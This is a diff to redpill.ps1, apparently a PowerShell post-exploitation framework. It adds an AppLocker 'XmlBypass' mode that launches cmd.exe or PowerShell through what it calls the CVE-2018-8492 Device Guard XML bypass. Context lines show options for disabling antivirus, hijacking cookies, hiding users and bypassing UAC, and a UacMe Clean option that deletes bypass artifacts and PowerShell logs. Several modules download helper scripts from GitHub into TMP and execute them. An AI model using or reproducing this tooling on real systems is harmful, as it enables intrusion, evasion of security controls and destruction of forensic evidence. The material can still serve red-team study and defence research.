@@ -91,16 +91,17 @@
    [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Uri="$env:TMP\SpawnPowershell.cs",
    [string]$OutFile="$Env:TMP\Installer.exe",
-   [string]$Execute="$PsHome\powershell.exe",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$CookieHijack="False",
    [string]$HiddenUser="false",
+   [string]$Execute="cmd.exe",
    [string]$DisableAV="false",
    [string]$EnableRDP="false",
    [string]$HideMyAss="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
+   [string]$TimeOpen="false",
    [string]$IconSet="False",
    [string]$Sponsor="false",
    [string]$UacMe="false",
@@ -643,7 +644,7 @@ If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,451171875/KB
+      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,4541015625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2088,16 +2089,26 @@ if($AppLocker -ne "false"){
       IdentityReference : BUILTIN\Utilizadores
    #>
 
-   ## Download AppLocker.ps1 from my GitHub
-   If(-not(Test-Path -Path "$Env:TMP\AppLocker.ps1")){## Download AppLocker.ps1 from my GitHub repository
-      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
-      ## Check downloaded file integrity => FileSizeKBytes
-      $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 23){## Corrupted download detected => DefaultFileSize: 23,486328125/KB
-         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
-         If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
-         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
-      }   
+   If($AppLocker -ieq "TestXml" -or $AppLocker -ieq "XmlBypass"){
+
+      If(-not(Test-Path -Path "$Env:TMP\AppLockerXml.ps1")){## Download AppLockerXml.ps1 from my GitHub repository
+         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/Modules/AppLockerXml.ps1" -OutFile "$Env:TMP\AppLockerXml.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      }
+
+   }Else{
+
+      ## Download AppLocker.ps1 from my GitHub
+      If(-not(Test-Path -Path "$Env:TMP\AppLocker.ps1")){## Download AppLocker.ps1 from my GitHub repository
+         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
+         ## Check downloaded file integrity => FileSizeKBytes
+         $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
+         If($SizeDump -lt 23){## Corrupted download detected => DefaultFileSize: 23,486328125/KB
+            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+            If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
+            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+         }   
+      }
+
    }
 
    ## Run auxiliary module
@@ -2111,6 +2122,8 @@ if($AppLocker -ne "false"){
           powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR" -Verb $Verb
        }
 
+   }ElseIf($AppLocker -ieq "XmlBypass"){
+       powershell -File "$Env:TMP\AppLockerXml.ps1" -Action XmlBypass -Execute "$Execute" -TimeOpen $TimeOpen
    }ElseIf($AppLocker -ieq "TestBat"){
        powershell -File "$Env:TMP\AppLocker.ps1" -TestBat Bypass
    }ElseIf($AppLocker -Match '(.bat)$'){
@@ -2123,6 +2136,7 @@ if($AppLocker -ne "false"){
 
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
+   If(Test-Path -Path "$Env:TMP\AppLockerXml.ps1"){Remove-Item -Path "$Env:TMP\AppLockerXml.ps1" -Force}
 }
 
 If($DnsSpoof -ne "false"){
@@ -2671,7 +2685,7 @@ If($UacMe -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 22){## Corrupted download detected => DefaultFileSize: 22,376953125/KB
+      If($SizeDump -lt 22){## Corrupted download detected => DefaultFileSize: 22,322265625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3962,10 +3976,10 @@ $HelpParameters = @"
       Accepts arguments: True, False (verbose enumeration)
 
    .Parameter AppLocker
-      Accepts arguments: Enum, WhoAmi and TestBat (default: Enum)
+      Accepts arguments: Enum, WhoAmi, TestBat, XmlBypass (default: Enum)
 
    .Parameter StartDir
-      The absoluct path where to start search recursive (default: %windir%)
+      [Enum] The absoluct path where to start search recursive (default: %windir%)
 
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll, ReadAndExecute (default: Write)
@@ -3973,28 +3987,42 @@ $HelpParameters = @"
    .Parameter GroupName
       Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE (default: BUILTIN\Users)
 
+   .Parameter Execute
+      [XmlBypass] The appl Name OR the appl to execute absoluct path! (default: cmd.exe)
+
+   .Parameter TimeOpen
+      [XmlBypass] The TimeOut to maintain the application open! (default: 1 seconds)
+
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
       Enumerate ALL Group Names available on local machine
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
+      PS C:\> .\redpill.ps1 -AppLocker TestBat
       Test for AppLocker Batch Script Execution Restrictions
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker "`$Env:TMP\applock.bat"
+      PS C:\> .\redpill.ps1 -AppLocker "`$Env:TMP\applock.bat"
       Execute applock.bat through text format applock bypass technic
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
+      PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "`$PSHome\Powershell.exe"
+      Execute 'Powershell.exe' trougth CVE-2018-8492 Windows Device Guard XML bypass technic!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "cmd.exe" -TimeOpen 5
+      Execute 'cmd.exe' trougth CVE-2018-8492 XML bypass technic and close it after 5 seconds!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
       Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions on it!
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
+      PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
       Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions on it!
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl" -StartDir "`$Env:PROGRAMFILES"
+      PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl" -StartDir "`$Env:PROGRAMFILES"
       Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions recursive starting in -StartDir [ dir ]
 
    .OUTPUTS
@@ -4353,7 +4381,7 @@ $HelpParameters = @"
       Accepts arguments: Bypass, Elevate, Clean
 
    .Parameter Execute
-      Accepts the command OR application absoluct path to be executed!
+      Accepts one cmdline OR application absoluct path to be executed!
 
    .Parameter Date
       Delete artifacts left behind by is 'CreationTime' (default: today)
@@ -4377,7 +4405,6 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe Clean
       Deletes uac bypass artifacts and powershell eventvwr logs!
-      Remark: Admin privileges are required to delete PS logfiles.
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
